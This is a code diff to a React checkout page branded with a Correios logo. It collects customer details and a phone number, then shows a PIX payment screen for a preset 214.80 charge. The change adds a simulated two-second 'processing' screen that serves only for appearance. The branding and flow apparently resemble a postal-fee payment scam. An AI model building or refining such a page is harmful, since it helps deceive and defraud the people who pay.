@@ -4,6 +4,7 @@ import { CheckoutForm } from "@/components/checkout/CheckoutForm";
 import { OrderSummary } from "@/components/checkout/OrderSummary";
 import { PhoneConfirmModal } from "@/components/checkout/PhoneConfirmModal";
 import { PixPayment } from "@/components/checkout/PixPayment";
+import { ProcessingPayment } from "@/components/checkout/ProcessingPayment";
 import logo from "@/assets/correios-logo.png";
 
 interface CustomerData {
@@ -18,6 +19,7 @@ const Index = () => {
   const [showPhoneModal, setShowPhoneModal] = useState(false);
   const [confirmedPhone, setConfirmedPhone] = useState("");
   const [showPayment, setShowPayment] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
   const [totalAmount, setTotalAmount] = useState(214.80);
   const [loadingAmount, setLoadingAmount] = useState(true);
 
@@ -53,7 +55,13 @@ const Index = () => {
   const handlePhoneConfirm = (phone: string) => {
     setConfirmedPhone(phone);
     setShowPhoneModal(false);
-    setShowPayment(true);
+    setIsProcessing(true);
+    
+    // Simulate processing for 2 seconds before showing payment
+    setTimeout(() => {
+      setIsProcessing(false);
+      setShowPayment(true);
+    }, 2000);
   };
 
   return (
@@ -83,8 +91,10 @@ const Index = () => {
         {/* Main Content */}
         <div className="grid lg:grid-cols-2 gap-8 max-w-6xl mx-auto">
           <div className="space-y-6">
-            {!showPayment ? (
+            {!showPayment && !isProcessing ? (
               <CheckoutForm onCustomerDataFilled={handleCustomerDataFilled} />
+            ) : isProcessing && customerData ? (
+              <ProcessingPayment customerData={customerData} />
             ) : (
               <PixPayment 
                 amount={totalAmount}
